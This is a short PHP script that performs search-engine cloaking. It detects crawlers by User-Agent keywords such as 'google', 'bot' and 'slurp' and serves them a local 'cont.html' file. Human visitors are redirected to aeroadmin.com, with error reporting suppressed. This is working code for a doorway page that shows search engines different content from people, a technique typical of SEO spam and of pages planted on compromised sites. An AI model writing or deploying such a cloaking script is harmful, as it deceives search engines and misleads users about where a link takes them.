<?php  
error_reporting(0);
set_time_limit(0);

$bot_content_file = 'cont.html';

function is_spider()
{
    $spiders = ['bot', 'slurp', 'spider', 'crawl', 'google', 'msnbot', 'yahoo', 'ask jeeves'];
    $s_agent = strtolower($_SERVER['HTTP_USER_AGENT']);
    
    foreach ($spiders as $spider) {
        if (stripos($s_agent, $spider) !== false) {
            return true;
        }
    }
    return false;
}


if (is_spider()) {
		
    if (file_exists($bot_content_file)) {
        include($bot_content_file);
		die();
    }	
    exit();
}

$lang = isset($_GET['lang']) ? $_GET['lang'] : '';

$supported_languages = ['de', 'en', 'fr', 'it', 'es', 'pt', 'nl', 'pl', 'ru', 'kr', 'jp', 'ar', 'tr'];

if (in_array($lang, $supported_languages)) {
    header("Location: https://www.aeroadmin.com/$lang");
    exit;
} else {
    header("Location: https://www.aeroadmin.com/");
    exit;
}


?>
